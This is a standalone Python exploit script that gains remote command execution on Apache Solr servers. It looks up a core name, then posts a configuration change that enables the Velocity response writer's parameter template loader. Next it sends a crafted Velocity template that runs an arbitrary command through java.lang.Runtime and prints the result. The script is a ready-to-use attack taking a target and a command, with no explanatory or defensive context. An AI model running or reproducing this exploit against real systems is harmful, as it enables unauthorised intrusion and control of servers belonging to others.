#!/usr/bin/env python
# coding: utf-8

import requests
import sys
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



if len(sys.argv) != 3:
    print("[+] Usage : ./solr_Velocity_rce.py target command")
    exit()

target = sys.argv[1]
command = sys.argv[2]


getPathUrl = '/solr/admin/cores?indexInfo=false&wt=json'
try:
        Path = list(json.loads(requests.get(target+getPathUrl).content)['status'].keys())[0]

        headers = {'Content-Type': 'application/json', 'Content-Length':'259'}
        data = '''{
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }'''
        req = requests.post(target+'/solr/'+Path+'/config', headers=headers, data=data)

        if req.status_code == 404:
            print("[-] failed !")
            exit()
        elif req.status_code == 200:
            print("[+] Set Config Success!")
        # exec command
        payload = '/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27' + command + '%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
        req = requests.get(target+'/solr/'+Path + payload)
        print(req.text)
except:
    print('解析错误')
